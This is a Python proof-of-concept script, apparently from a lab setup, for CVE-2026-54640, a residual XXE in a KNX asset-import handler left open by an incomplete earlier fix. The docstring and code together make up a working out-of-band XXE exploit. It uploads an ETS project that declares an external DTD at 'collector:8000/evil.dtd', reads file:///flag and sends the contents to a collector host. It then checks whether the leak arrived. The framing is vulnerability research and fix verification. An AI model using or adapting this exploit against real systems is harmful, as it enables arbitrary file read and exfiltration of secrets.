#!/usr/bin/env python3
"""BYPASS / RESIDUAL PoC -- CVE-2026-54640 (incomplete fix for CVE-2026-40882).

The 1.22.0 fix hardened ONLY the Velbus asset-import handler. The sibling KNX
asset-import handler, KNXProtocol.startAssetImport(), still parses the uploaded
ETS project with an unprotected Saxon TransformerFactoryImpl + StAX
XMLInputFactory. This PoC uploads an ETS .knxproj whose 0.xml declares an
external DTD:

    <!DOCTYPE KNX SYSTEM "http://collector:8000/evil.dtd">

The Saxon transform of 0.xml fetches evil.dtd, which runs an OOB parameter-entity
chain that reads file:///flag and beacons it to the collector. (In-band
reflection is impossible on this path: ETS values are XML attributes, where
external entity references are forbidden, and the importer swallows parse
errors -- so blind OOB is the exfil channel, matching the advisory's C:H
"arbitrary file read".)

  - V1 (1.22.0): reads the flag (collector logs the /flag contents) = TARGET.
  - V2 (1.24.2): CVE-2026-54640 fix -> createSecureTransformerFactory with
                 ACCESS_EXTERNAL_DTD="" -> external DTD access prohibited -> blocked.

Usage:  bypass_poc.py <manager_base_url> [<collector_base_url>]
        e.g. bypass_poc.py http://127.0.0.1:18080 http://127.0.0.1:18085
Prints 'FLAG_READ: <token>' if the canary reached the collector, else 'BLOCKED'.
"""
import sys, os, time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import orlib

# On the manager's internal network the collector is reachable as collector:8000.
INTERNAL_DTD_URL = "http://collector:8000/evil.dtd"


def run(base, collector_base):
    token = orlib.get_token(base)
    agent_id = orlib.create_knx_agent(base, token, host="10.255.255.1")
    time.sleep(8)  # let the KNX protocol instance register
    orlib.collector_reset(collector_base)
    payload = orlib.build_knx_oob_payload(INTERNAL_DTD_URL)
    status, assets = orlib.do_import(base, token, agent_id, payload, name="knx-import-testproject.knxproj")
    time.sleep(3)  # allow the OOB beacon to arrive
    hits = orlib.collector_hits(collector_base)
    print("HTTP", status, "collector_hits:", repr(hits.strip()))
    for line in hits.splitlines():
        if line.startswith("LEAK f="):
            token_val = line[len("LEAK f="):].strip()
            print("FLAG_READ:", token_val)
            return token_val
    print("BLOCKED (no OOB exfil reached the collector)")
    return None


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18080"
    coll = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:18085"
    run(base, coll)
